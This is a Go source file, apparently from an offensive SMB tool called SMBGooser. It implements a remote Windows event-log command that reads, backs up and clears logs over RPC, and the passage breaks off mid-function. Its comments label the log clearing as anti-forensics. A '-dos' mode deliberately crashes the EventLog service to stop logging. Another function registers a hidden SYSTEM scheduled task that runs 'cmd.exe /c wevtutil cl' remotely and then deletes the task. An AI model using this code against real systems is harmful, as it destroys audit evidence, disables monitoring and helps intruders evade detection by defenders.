package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/ineffectivecoder/SMBGooser/internal/encoding"
	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
	"github.com/ineffectivecoder/SMBGooser/pkg/tsch"
)

func init() {
	commands.Register(&Command{
		Name:        "eventlog",
		Aliases:     []string{},
		Description: "Read Windows Event Logs",
		Usage:       "eventlog [log] [count]",
		Handler:     cmdEventLog,
	})
}

// EVENTLOG UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
var eventlogUUID = dcerpc.UUID{
	0xdc, 0x3f, 0x27, 0x82,
	0x2a, 0xe3,
	0xc3, 0x18,
	0x3f, 0x78,
	0x82, 0x79, 0x29, 0xdc, 0x23, 0xea,
}

// even6 UUID (MS-EVEN6) - newer Windows Event Log API
var even6UUID = dcerpc.UUID{
	0xf7, 0xaf, 0xbe, 0xf6,
	0x19, 0x1e,
	0xbb, 0x4f,
	0x9f, 0x8f,
	0xb8, 0x9e, 0x20, 0x18, 0x33, 0x7c,
}

// Eventlog opnums (MS-EVEN)
const (
	opElfrClearELFW       = 0  // Clear log
	opElfrBackupELFW      = 1  // Backup log
	opElfrCloseEL         = 2  // Close handle
	opElfrNumberOfRecords = 4  // Get record count
	opElfrOldestRecord    = 5  // Get oldest record
	opElfrOpenELW         = 7  // Open log
	opElfrReadELW         = 10 // Read events
	opElfrReportEventW    = 11 // Write event
)

// even6 opnums (MS-EVEN6)
const (
	opEvtRpcRegisterControllableOperation = 4  // Get control handle
	opEvtRpcClearLog                      = 6  // Clear log
	opEvtRpcExportLog                     = 7  // Export/backup log
	opEvtRpcClose                         = 13 // Close handle
)

// Event types
const (
	eventError        = 1
	eventWarning      = 2
	eventInformation  = 4
	eventAuditSuccess = 8
	eventAuditFailure = 16
)

// cmdEventLog handles event log operations
func cmdEventLog(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) == 0 {
		printEventLogHelp()
		return nil
	}

	switch strings.ToLower(args[0]) {
	case "clear":
		return cmdEventLogClear(ctx, args[1:])
	case "backup":
		return cmdEventLogBackup(ctx, args[1:])
	case "write":
		return cmdEventLogWrite(ctx, args[1:])
	case "read":
		return cmdEventLogRead(ctx, args[1:])
	case "help":
		printEventLogHelp()
		return nil
	default:
		// Legacy mode: treat as read with log name
		return cmdEventLogRead(ctx, args)
	}
}

// cmdEventLogRead reads event logs
func cmdEventLogRead(ctx context.Context, args []string) error {
	logName := "Security"
	count := 10

	for i := 0; i < len(args); i++ {
		switch strings.ToLower(args[i]) {
		case "security":
			logName = "Security"
		case "system":
			logName = "System"
		case "application":
			logName = "Application"
		default:
			var n int
			if _, err := fmt.Sscanf(args[i], "%d", &n); err == nil && n > 0 {
				count = n
			}
		}
	}

	info_("Connecting to Event Log service...")

	// Connect to IPC$
	tree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %w", err)
	}
	defer client.TreeDisconnect(ctx, tree)

	// Open eventlog pipe
	p, err := pipe.Open(ctx, tree, "eventlog")
	if err != nil {
		return fmt.Errorf("failed to open eventlog pipe: %w", err)
	}
	defer p.Close()

	rpc := dcerpc.NewClient(p)
	defer rpc.Close()

	// Bind
	if err := rpc.Bind(eventlogUUID, 0); err != nil {
		return fmt.Errorf("failed to bind: %w", err)
	}

	// Open event log
	info_("Opening %s log...", logName)
	openStub := encodeOpenEventLog(logName)

	resp, err := rpc.Call(opElfrOpenELW, openStub)
	if err != nil {
		return fmt.Errorf("ElfrOpenELW failed: %w", err)
	}

	if len(resp) < 24 {
		return fmt.Errorf("invalid response")
	}

	var logHandle [20]byte
	copy(logHandle[:], resp[:20])

	retCode := binary.LittleEndian.Uint32(resp[20:24])
	if retCode != 0 {
		return fmt.Errorf("failed to open log: 0x%08X", retCode)
	}

	// Get number of records
	numStub := make([]byte, 20)
	copy(numStub, logHandle[:])

	resp, err = rpc.Call(opElfrNumberOfRecords, numStub)
	if err != nil {
		warn_("Failed to get record count: %v", err)
	} else if len(resp) >= 8 {
		numRecords := binary.LittleEndian.Uint32(resp[:4])
		info_("Log has %d records", numRecords)
	}

	// Read events
	info_("Reading last %d events...", count)

	fmt.Println()
	fmt.Printf("  %s%s Event Log:%s\n", colorBold, logName, colorReset)
	fmt.Println("  " + strings.Repeat("-", 70))

	readStub := encodeReadEventLog(logHandle, count)
	resp, err = rpc.Call(opElfrReadELW, readStub)
	if err != nil {
		warn_("ElfrReadELW failed: %v", err)
		fmt.Println("  (Could not read events - may need elevated privileges)")
	} else {
		events := parseEventLogResponse(resp)
		if len(events) == 0 {
			fmt.Println("  No events returned (or access denied)")
		} else {
			for _, e := range events {
				fmt.Printf("  %s\n", e)
			}
		}
	}

	// Close handle
	closeStub := make([]byte, 20)
	copy(closeStub, logHandle[:])
	rpc.Call(opElfrCloseEL, closeStub)

	fmt.Println()
	return nil
}

func encodeOpenEventLog(logName string) []byte {
	stub := make([]byte, 0, 128)

	// UNCServerName - NULL pointer (LPWSTR)
	stub = appendUint32EL(stub, 0)

	// ModuleName (RPC_UNICODE_STRING)
	nameBytes := utf16Encode(logName)
	length := uint16(len(nameBytes))

	stub = appendUint16EL(stub, length)     // Length (bytes)
	stub = appendUint16EL(stub, length)     // MaximumLength = Length (no null adjustment per Impacket)
	stub = appendUint32EL(stub, 0x00020000) // Buffer pointer referent ID

	// String data (conformant varying array) - NO null terminator per Impacket
	stub = appendUint32EL(stub, uint32(len(logName))) // MaxCount = char count (no null)
	stub = appendUint32EL(stub, 0)                    // Offset
	stub = appendUint32EL(stub, uint32(len(logName))) // ActualCount (no null)
	stub = append(stub, nameBytes...)                 // String data (no null terminator)

	// Pad to 4 bytes
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// RegModuleName (empty RPC_UNICODE_STRING)
	stub = appendUint16EL(stub, 0) // Length
	stub = appendUint16EL(stub, 0) // MaximumLength
	stub = appendUint32EL(stub, 0) // NULL pointer

	// MajorVersion, MinorVersion
	stub = appendUint32EL(stub, 1)
	stub = appendUint32EL(stub, 1)

	return stub
}

func encodeReadEventLog(handle [20]byte, count int) []byte {
	stub := make([]byte, 0, 40)

	stub = append(stub, handle[:]...)

	// ReadFlags: EVENTLOG_SEQUENTIAL_READ (0x0001) | EVENTLOG_BACKWARDS_READ (0x0008) = 0x0009
	stub = appendUint32EL(stub, 0x0001|0x0008)

	// RecordOffset (ignored for sequential read)
	stub = appendUint32EL(stub, 0)

	// NumberOfBytesToRead - use 64KB for sufficient buffer
	bufSize := 0x10000 // 64KB
	stub = appendUint32EL(stub, uint32(bufSize))

	return stub
}

func parseEventLogResponse(resp []byte) []string {
	var events []string

	if len(resp) < 20 {
		return events
	}
	if verbose {
		fmt.Printf("[DEBUG] Read response: %d bytes\n", len(resp))
	}

	// NDRUniConformantArray format: MaxCount (4 bytes) + data
	// Response: MaxCount + Buffer + NumberOfBytesRead (4) + MinNumberOfBytesNeeded (4) + ErrorCode (4)
	maxCount := binary.LittleEndian.Uint32(resp[:4])

	if maxCount == 0 {
		return events
	}

	// The buffer starts at offset 4
	bufferStart := 4
	// Trailer is at the end: NumberOfBytesRead + MinBytes + ErrorCode = 12 bytes
	if len(resp) < int(maxCount)+bufferStart+12 {
		return events
	}

	// Parse trailer
	trailerStart := bufferStart + int(maxCount)
	bytesRead := binary.LittleEndian.Uint32(resp[trailerStart:])
	minBytesNeeded := binary.LittleEndian.Uint32(resp[trailerStart+4:])
	errorCode := binary.LittleEndian.Uint32(resp[trailerStart+8:])

	if verbose {
		fmt.Printf("[DEBUG] BytesRead: %d, MinBytesNeeded: %d, ErrorCode: 0x%x\n", bytesRead, minBytesNeeded, errorCode)
	}

	if errorCode != 0 && errorCode != 0x7A { // 0x7A = ERROR_INSUFFICIENT_BUFFER
		return events
	}

	if bytesRead == 0 {
		return events
	}

	// Event data is in the buffer starting at offset 4 (after MaxCount)
	bufferData := resp[bufferStart : bufferStart+int(bytesRead)]

	// Parse EVENTLOGRECORD structures
	offset := 0
	maxEvents := 50
	for evtNum := 0; evtNum < maxEvents && offset+56 < len(bufferData); evtNum++ {
		// Length (4 bytes)
		if offset+4 > len(bufferData) {
			break
		}

		length := binary.LittleEndian.Uint32(bufferData[offset:])

		// Validate record length
		if length < 56 || length > 0xFFFF || offset+int(length) > len(bufferData) {
			if verbose && evtNum == 0 {
				fmt.Printf("[DEBUG] Invalid record length at offset %d: %d\n", offset, length)
			}
			break
		}

		// Verify magic number (0x654c664c = "LfLe")
		if offset+8 <= len(bufferData) {
			magic := binary.LittleEndian.Uint32(bufferData[offset+4:])
			if magic != 0x654c664c {
				if verbose && evtNum == 0 {
					fmt.Printf("[DEBUG] Invalid magic at offset %d: 0x%08x\n", offset, magic)
				}
				break
			}
		}

		// Parse event record
		record := bufferData[offset : offset+int(length)]
		event := parseEventRecord(record)
		if event != "" {
			events = append(events, event)
		}

		offset += int(length)
	}

	return events
}

func parseEventRecord(record []byte) string {
	if len(record) < 56 {
		return ""
	}

	// EVENTLOGRECORD structure offsets:
	// [0-3]: Length
	// [4-7]: Reserved ("LfLe")
	// [8-11]: RecordNumber
	// [12-15]: TimeGenerated
	// [16-19]: TimeWritten
	// [20-23]: EventID (full DWORD, low 16 bits = ID, high 16 bits = facility/severity)
	// [24-25]: EventType
	// [26-27]: NumStrings
	// [28-29]: EventCategory
	// [36-39]: StringOffset
	// [56+]: SourceName (null-terminated UTF-16), then ComputerName, then strings at StringOffset

	recordNumber := binary.LittleEndian.Uint32(record[8:12])
	timeGenerated := binary.LittleEndian.Uint32(record[12:16])
	eventIDFull := binary.LittleEndian.Uint32(record[20:24])
	eventID := eventIDFull & 0xFFFF // Low 16 bits
	eventType := binary.LittleEndian.Uint16(record[24:26])
	numStrings := binary.LittleEndian.Uint16(record[26:28])
	eventCategory := binary.LittleEndian.Uint16(record[28:30])
	stringOffset := binary.LittleEndian.Uint32(record[36:40])

	// Extract source name (UTF-16 null-terminated at offset 56)
	sourceName := ""
	if len(record) > 56 {
		sourceName = readUTF16String(record[56:])
	}

	// Extract computer name (after source name)
	computerName := ""
	if len(record) > 56 {
		sourceLen := len(sourceName)*2 + 2 // UTF-16 length + null terminator
		computerOffset := 56 + sourceLen
		if computerOffset < len(record) {
			computerName = readUTF16String(record[computerOffset:])
		}
	}

	// Extract event strings (the actual message content)
	var eventStrings []string
	if numStrings > 0 && int(stringOffset) < len(record) {
		stringsData := record[stringOffset:]
		for i := 0; i < int(numStrings) && len(stringsData) > 0; i++ {
			s := readUTF16String(stringsData)
			if s != "" {
				eventStrings = append(eventStrings, s)
			}
			// Move past this string (UTF-16 length + null terminator)
			skip := (len(s) + 1) * 2
			if skip > len(stringsData) {
				break
			}
			stringsData = stringsData[skip:]
		}
	}

	// Convert timestamp
	t := time.Unix(int64(timeGenerated), 0)

	// Event type string
	typeStr := "INFO"
	switch eventType {
	case eventError:
		typeStr = colorRed + "ERROR" + colorReset
	case eventWarning:
		typeStr = colorYellow + "WARN" + colorReset
	case eventAuditSuccess:
		typeStr = colorGreen + "AUDIT+" + colorReset
	case eventAuditFailure:
		typeStr = colorRed + "AUDIT-" + colorReset
	}

	// Build output with strings detail
	var result strings.Builder
	fmt.Fprintf(&result, "[%s] #%-6d %-7s %s EventID: %d",
		t.Format("2006-01-02 15:04:05"), recordNumber, typeStr, sourceName, eventID)

	if eventCategory > 0 {
		fmt.Fprintf(&result, " Cat:%d", eventCategory)
	}

	if computerName != "" && computerName != sourceName {
		fmt.Fprintf(&result, " [%s]", computerName)
	}

	// Format event strings with labels based on event ID
	if len(eventStrings) > 0 {
		// Clean all strings first
		var cleaned []string
		for _, s := range eventStrings {
			if s == "" || s == "-" || s == "0x0" || s == "0" || s == "%%1842" {
				continue
			}
			s = strings.ReplaceAll(s, "\r\n", " ")
			s = strings.ReplaceAll(s, "\n", " ")
			s = strings.ReplaceAll(s, "\t", " ")
			for strings.Contains(s, "  ") {
				s = strings.ReplaceAll(s, "  ", " ")
			}
			s = strings.TrimSpace(s)
			if s == "" {
				continue
			}
			// Skip full SIDs and NULL SID
			if strings.HasPrefix(s, "S-1-") && (len(s) > 15 || s == "S-1-0-0") {
				continue
			}
			// Skip hex values
			if strings.HasPrefix(s, "0x") && len(s) > 4 {
				continue
			}
			// Skip GUIDs
			if len(s) == 38 && strings.Contains(s, "-") && strings.HasPrefix(s, "{") {
				continue
			}
			cleaned = append(cleaned, s)
		}

		if len(cleaned) > 0 {
			fmt.Fprintf(&result, "\n       ")

			// Event-specific formatting
			switch eventID {
			case 4624: // Logon
				formatLogonEvent(&result, cleaned)
			case 4634, 4647: // Logoff
				formatLogoffEvent(&result, cleaned)
			case 4672: // Special privileges
				formatPrivilegeEvent(&result, cleaned)
			case 4776: // Credential validation
				formatCredValidationEvent(&result, cleaned)
			case 4625: // Failed logon
				formatFailedLogonEvent(&result, cleaned)
			default:
				// Generic format for other events
				for i, s := range cleaned {
					if i >= 5 {
						fmt.Fprintf(&result, " ...")
						break
					}
					if len(s) > 40 {
						s = s[:37] + "..."
					}
					if i > 0 {
						fmt.Fprintf(&result, " | ")
					}
					fmt.Fprintf(&result, "%s", s)
				}
			}
		}
	}

	return result.String()
}

// Event formatting helpers
func formatLogonEvent(result *strings.Builder, parts []string) {
	// 4624: Logon - typically has user, domain, logon type, auth pkg
	user := findField(parts, isUsername)
	domain := findField(parts, isDomain)
	authPkg := findField(parts, isAuthPkg)
	logonType := findField(parts, isLogonType)
	srcIP := findField(parts, isIPAddress)
	workstation := findFieldExcluding(parts, isWorkstationName, []string{domain, user})

	if user != "" {
		fmt.Fprintf(result, "User: %s", user)
		if domain != "" {
			fmt.Fprintf(result, "@%s", domain)
		}
	}
	if logonType != "" {
		fmt.Fprintf(result, " | Type: %s", logonType)
	}
	if authPkg != "" {
		fmt.Fprintf(result, " | Auth: %s", authPkg)
	}
	if srcIP != "" && srcIP != "-" && srcIP != "::1" && srcIP != "127.0.0.1" {
		fmt.Fprintf(result, " | From: %s", srcIP)
	}
	if workstation != "" && workstation != "-" {
		fmt.Fprintf(result, " | Host: %s", workstation)
	}
}

func formatLogoffEvent(result *strings.Builder, parts []string) {
	// 4634: Logoff
	user := findField(parts, isUsername)
	domain := findField(parts, isDomain)

	if user != "" {
		fmt.Fprintf(result, "User: %s", user)
		if domain != "" {
			fmt.Fprintf(result, "@%s", domain)
		}
	} else if len(parts) > 0 {
		fmt.Fprintf(result, "%s", strings.Join(parts[:min(3, len(parts))], " | "))
	}
}

func formatPrivilegeEvent(result *strings.Builder, parts []string) {
	// 4672: Special privileges assigned
	user := findField(parts, isUsername)
	domain := findField(parts, isDomain)
	privs := findField(parts, isPrivilegeList)

	if user != "" {
		fmt.Fprintf(result, "User: %s", user)
		if domain != "" {
			fmt.Fprintf(result, "@%s", domain)
		}
	}
	if privs != "" {
		// Format privileges nicely - replace spaces with commas
		privs = strings.ReplaceAll(privs, " Se", ", Se")
		privs = strings.TrimPrefix(privs, ", ")
		fmt.Fprintf(result, "\n              Privs: %s", privs)
	}
}

func formatCredValidationEvent(result *strings.Builder, parts []string) {
	// 4776: Credential validation - fields are in order: AuthPackage, User, Workstation, Status
	// Skip auth package names and just show user
	var user, workstation string
	for _, p := range parts {
		if strings.Contains(strings.ToLower(p), "authentication_package") || p == "NTLM" {
			continue // Skip auth package
		}
		if user == "" && !strings.HasPrefix(p, "0x") && len(p) > 0 {
			user = p
		} else if workstation == "" && user != "" && p != "WORKSTATION" {
			workstation = p
		}
	}

	if user != "" {
		fmt.Fprintf(result, "User: %s", user)
	}
	if workstation != "" {
		fmt.Fprintf(result, " | Workstation: %s", workstation)
	}
}

func formatFailedLogonEvent(result *strings.Builder, parts []string) {
	// 4625: Failed logon
	user := findField(parts, isUsername)
	domain := findField(parts, isDomain)

	if user != "" {
		fmt.Fprintf(result, "Failed: %s", user)
		if domain != "" {
			fmt.Fprintf(result, "@%s", domain)
		}
	} else if len(parts) > 0 {
		fmt.Fprintf(result, "%s", strings.Join(parts[:min(3, len(parts))], " | "))
	}
}

// Field detection helpers
func findField(parts []string, matcher func(string) bool) string {
	for _, p := range parts {
		if matcher(p) {
			return p
		}
	}
	return ""
}

func isUsername(s string) bool {
	// Usernames: user accounts or computer accounts (ending in $)
	if strings.Contains(s, " ") || strings.Contains(s, "\\") {
		return false
	}
	// Computer accounts end with $
	if strings.HasSuffix(s, "$") && len(s) > 1 {
		return true
	}
	lc := strings.ToLower(s)
	// Exclude known keywords
	if lc == "ntlm" || lc == "kerberos" || lc == "workstation" || strings.HasPrefix(lc, "se") {
		return false
	}
	if strings.HasPrefix(s, "S-1-") || strings.HasPrefix(s, "0x") || strings.HasPrefix(s, "{") {
		return false
	}
	// Skip if all uppercase (likely domain)
	if strings.ToUpper(s) == s && !strings.HasSuffix(s, "$") {
		return false
	}
	// Must have at least one letter
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			return true
		}
	}
	return false
}

func isDomain(s string) bool {
	// Domains are uppercase, not ending in $ (computer accounts)
	if len(s) < 3 || strings.Contains(s, " ") || strings.HasSuffix(s, "$") {
		return false
	}
	// Must be all uppercase
	if strings.ToUpper(s) != s {
		return false
	}
	// Exclude known non-domains
	if strings.HasPrefix(s, "S-1-") || strings.HasPrefix(s, "0x") || s == "NTLM" || s == "WORKSTATION" {
		return false
	}
	return true
}

func isAuthPkg(s string) bool {
	lc := strings.ToLower(s)
	return lc == "ntlm" || lc == "kerberos" || strings.Contains(lc, "ntlmssp") ||
		strings.Contains(lc, "authentication_package")
}

func isLogonType(s string) bool {
	// Logon types are small numbers like 2, 3, 10
	if len(s) > 2 {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func isPrivilegeList(s string) bool {
	return strings.HasPrefix(s, "Se") && strings.Contains(s, "Privilege")
}

func isWorkstation(s string) bool {
	return s == "WORKSTATION" || (len(s) > 5 && strings.ToUpper(s) == s && !strings.HasPrefix(s, "SE"))
}

func isIPAddress(s string) bool {
	// Match IPv4 or IPv6 addresses
	if s == "-" || s == "" {
		return false
	}
	// IPv4: contains dots and numbers
	if strings.Contains(s, ".") {
		parts := strings.Split(s, ".")
		if len(parts) == 4 {
			return true
		}
	}
	// IPv6: contains colons
	if strings.Contains(s, ":") && !strings.Contains(s, " ") {
		return true
	}
	return false
}

func isWorkstationName(s string) bool {
	// Workstation names in logs - uppercase, no dots (not FQDNs), not keywords
	if len(s) < 2 || strings.Contains(s, " ") || strings.Contains(s, ".") {
		return false
	}
	// Skip Windows message format tokens like %%1833
	if strings.HasPrefix(s, "%%") {
		return false
	}
	if strings.HasPrefix(s, "S-1-") || strings.HasPrefix(s, "0x") || strings.HasPrefix(s, "Se") {
		return false
	}
	// Skip pure numbers (these are port numbers, not hostnames)
	allDigits := true
	for _, c := range s {
		if c < '0' || c > '9' {
			allDigits = false
			break
		}
	}
	if allDigits {
		return false
	}
	// Skip known non-workstation strings
	lc := strings.ToLower(s)
	if lc == "ntlm" || lc == "kerberos" || lc == "workstation" || lc == "ntlmssp" {
		return false
	}
	// Uppercase and not too long
	return strings.ToUpper(s) == s && len(s) <= 15
}

func findFieldExcluding(parts []string, matcher func(string) bool, exclude []string) string {
	for _, p := range parts {
		if matcher(p) {
			// Check if this is in the exclude list
			excluded := false
			for _, ex := range exclude {
				if p == ex {
					excluded = true
					break
				}
			}
			if !excluded {
				return p
			}
		}
	}
	return ""
}

// readUTF16String reads a null-terminated UTF-16 string
func readUTF16String(data []byte) string {
	var chars []rune
	for i := 0; i+1 < len(data); i += 2 {
		ch := uint16(data[i]) | uint16(data[i+1])<<8
		if ch == 0 {
			break
		}
		chars = append(chars, rune(ch))
	}
	return string(chars)
}

// truncateStr truncates a string to max length
func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-2] + ".."
}

func utf16Encode(s string) []byte {
	return encoding.ToUTF16LE(s)
}

func appendUint32EL(buf []byte, v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return append(buf, b...)
}

func appendUint16EL(buf []byte, v uint16) []byte {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, v)
	return append(buf, b...)
}

func printEventLogHelp() {
	fmt.Println("\nUsage: eventlog <subcommand> [args]")
	fmt.Println("\nSubcommands:")
	fmt.Println("  read <log> [count]           Read events from log (default: Security, 10)")
	fmt.Println("  clear <log> [backup_path]    Clear log (optionally backup first)")
	fmt.Println("  backup <log> <path>          Backup log to remote file")
	fmt.Println("  write <log> <message>        Write a custom event to log")
	fmt.Println("\nLogs: Security, System, Application")
	fmt.Println("\nExamples:")
	fmt.Println("  eventlog read Security 20")
	fmt.Println("  eventlog backup Security C:\\temp\\sec.evtx")
	fmt.Println("  eventlog clear Security")
	fmt.Println("  eventlog write Application \"Test event from SMBGooser\"")
	fmt.Println()
}

// cmdEventLogClear clears an event log
// Uses legacy API with temp backup file (NULL backup crashes Windows!)
// Use -dos flag to intentionally crash the service (anti-forensics)
func cmdEventLogClear(ctx context.Context, args []string) error {
	if len(args) < 1 {
		fmt.Println("Usage: eventlog clear <log> [-dos]")
		fmt.Println("Example: eventlog clear Security")
		fmt.Println("Example: eventlog clear Application")
		fmt.Println()
		fmt.Println("Options:")
		fmt.Println("  -dos    Crash EventLog service instead of clearing (disables logging)")
		return nil
	}

	logName := args[0]
	dosMode := false

	// Parse options
	for _, arg := range args[1:] {
		if arg == "-dos" || arg == "--dos" {
			dosMode = true
		}
	}

	if dosMode {
		return clearEventLogDoS(ctx, logName)
	}

	// Normal mode - clear using legacy API with a temp backup file
	// Using \\??\\ device path format which Windows requires
	return clearEventLogWithBackup(ctx, logName)
}

// clearEventLogWithBackup clears log properly using a temp backup file
// Note: Windows crashes if NULL backup is passed, so we must provide a path
func clearEventLogWithBackup(ctx context.Context, logName string) error {
	info_("Connecting to Event Log service...")
	rpc, logHandle, err := openEventLog(ctx, logName)
	if err != nil {
		return err
	}
	defer closeEventLog(rpc, logHandle)

	// Generate a temp backup path using device path format (required by Windows)
	// The \??\ prefix is required for the RPC call
	backupPath := fmt.Sprintf(`\??\C:\Windows\Temp\%s_%d.evtx`, logName, time.Now().Unix())
	info_("Clearing %s log (backup: %s)...", logName, backupPath)

	clearStub := encodeClearEventLog(logHandle, backupPath)
	resp, err := rpc.Call(opElfrClearELFW, clearStub)
	if err != nil {
		return fmt.Errorf("ElfrClearELFW failed: %w", err)
	}

	if len(resp) >= 4 {
		retCode := binary.LittleEndian.Uint32(resp[:4])
		if retCode != 0 {
			return fmt.Errorf("clear failed: 0x%08X", retCode)
		}
	}

	success_("Event log %s cleared!", logName)
	return nil
}

// clearEventLogWevtutil clears log using wevtutil via remote execution
func clearEventLogWevtutil(ctx context.Context, logName string) error {
	info_("Clearing %s log via wevtutil...", logName)

	// Build the wevtutil command
	cmd := fmt.Sprintf("wevtutil cl %s", logName)

	// Use atexec-style execution via Task Scheduler
	tree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %w", err)
	}

	// Open Task Scheduler pipe
	p, err := pipe.Open(ctx, tree, "atsvc")
	if err != nil {
		return fmt.Errorf("failed to open atsvc pipe: %w", err)
	}
	defer p.Close()

	rpc := dcerpc.NewClient(p)
	defer rpc.Close()

	// Bind to task scheduler
	tschUUID := dcerpc.UUID{
		0x86, 0xd3, 0x59, 0x49,
		0x83, 0xc9,
		0x44, 0x40,
		0xb4, 0x24,
		0xdb, 0x36, 0x32, 0x31, 0xfd, 0x0c,
	}

	if err := rpc.Bind(tschUUID, 1); err != nil {
		return fmt.Errorf("failed to bind to Task Scheduler: %w", err)
	}

	// Create a one-time task to run the command immediately
	taskName := fmt.Sprintf("SMBGooser_%d", time.Now().Unix())
	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c %s</Arguments>
    </Exec>
  </Actions>
</Task>`, cmd)

	// Encode SchRpcRegisterTask (opnum 1)
	stub := encodeSchRpcRegisterTask(taskName, taskXML)
	resp, err := rpc.Call(1, stub)
	if err != nil {
		return fmt.Errorf("SchRpcRegisterTask failed: %w", err)
	}

	// Check result
	if len(resp) >= 4 {
		retCode := binary.LittleEndian.Uint32(resp[len(resp)-4:])
		if retCode != 0 {
			return fmt.Errorf("task creation failed: 0x%08X", retCode)
		}
	}

	// Wait a moment for the task to run
	time.Sleep(2 * time.Second)

	// Delete the task (cleanup)
	deleteStub := encodeSchRpcDelete(taskName)
	rpc.Call(6, deleteStub) // SchRpcDelete = opnum 6

	success_("Event log %s cleared!", logName)
	return nil
}

// encodeSchRpcRegisterTask encodes the SchRpcRegisterTask request
func encodeSchRpcRegisterTask(taskPath, taskXML string) []byte {
	stub := make([]byte, 0, 4096)

	// Path (WSTR)
	pathStr := "\\" + taskPath
	pathBytes := utf16Encode(pathStr)
	stub = appendUint32EL(stub, uint32(len(pathStr)+1)) // MaxCount
	stub = appendUint32EL(stub, 0)                      // Offset
	stub = appendUint32EL(stub, uint32(len(pathStr)+1)) // ActualCount
	stub = append(stub, pathBytes...)
	stub = append(stub, 0, 0) // Null
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// XML (WSTR)
	xmlBytes := utf16Encode(taskXML)
	stub = appendUint32EL(stub, uint32(len(taskXML)+1)) // MaxCount
	stub = appendUint32EL(stub, 0)                      // Offset
	stub = appendUint32EL(stub, uint32(len(taskXML)+1)) // ActualCount
	stub = append(stub, xmlBytes...)
	stub = append(stub, 0, 0) // Null
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// Flags (DWORD = 6 = TASK_CREATE | TASK_UPDATE)
	stub = appendUint32EL(stub, 6)

	// sddl - NULL pointer
	stub = appendUint32EL(stub, 0)

	// logonType (DWORD = 5 = TASK_LOGON_SERVICE_ACCOUNT)
	stub = appendUint32EL(stub, 5)

	// cCreds (DWORD = 0)
	stub = appendUint32EL(stub, 0)

	// pCreds - NULL pointer
	stub = appendUint32EL(stub, 0)

	return stub
}

// encodeSchRpcDelete encodes the SchRpcDelete request
func encodeSchRpcDelete(taskPath string) []byte {
	stub := make([]byte, 0, 128)

	// Path (WSTR)
	pathStr := "\\" + taskPath
	pathBytes := utf16Encode(pathStr)
	stub = appendUint32EL(stub, uint32(len(pathStr)+1)) // MaxCount
	stub = appendUint32EL(stub, 0)                      // Offset
	stub = appendUint32EL(stub, uint32(len(pathStr)+1)) // ActualCount
	stub = append(stub, pathBytes...)
	stub = append(stub, 0, 0) // Null
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// Flags (DWORD = 0)
	stub = appendUint32EL(stub, 0)

	return stub
}

// clearEventLogDoS crashes the EventLog service (anti-forensics)
func clearEventLogDoS(ctx context.Context, logName string) error {
	warn_("DoS mode: Crashing EventLog service...")

	// Try legacy API which crashes the service
	rpc, logHandle, err := openEventLog(ctx, logName)
	if err != nil {
		return err
	}
	defer closeEventLog(rpc, logHandle)

	clearStub := encodeClearEventLog(logHandle, "")
	_, err = rpc.Call(opElfrClearELFW, clearStub)
	if err != nil {
		if strings.Contains(err.Error(), "0xC000014B") || strings.Contains(err.Error(), "disconnect") {
			warn_("EventLog service crashed/stopped (log collection disabled)")
			info_("Use 'svc start EventLog' to restart the service")
			return nil
		}
		return fmt.Errorf("DoS failed: %w", err)
	}

	// If it somehow worked without crashing
	success_("Event log %s cleared!", logName)
	return nil
}

// clearEventLogEven6 uses the MS-EVEN6 API (EvtRpcClearLog)
func clearEventLogEven6(ctx context.Context, logName, backupPath string) error {
	tree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %w", err)
	}

	p, err := pipe.Open(ctx, tree, "eventlog")
	if err != nil {
		return fmt.Errorf("failed to open eventlog pipe: %w", err)
	}
	defer p.Close()

	rpc := dcerpc.NewClient(p)
	defer rpc.Close()

	// Bind to even6 interface
	if err := rpc.Bind(even6UUID, 1); err != nil {
		return fmt.Errorf("failed to bind to even6: %w", err)
	}

	// Step 1: Register controllable operation to get control handle
	controlStub := make([]byte, 0)
	resp, err := rpc.Call(opEvtRpcRegisterControllableOperation, controlStub)
	if err != nil {
		return fmt.Errorf("EvtRpcRegisterControllableOperation failed: %w", err)
	}

	if len(resp) < 24 {
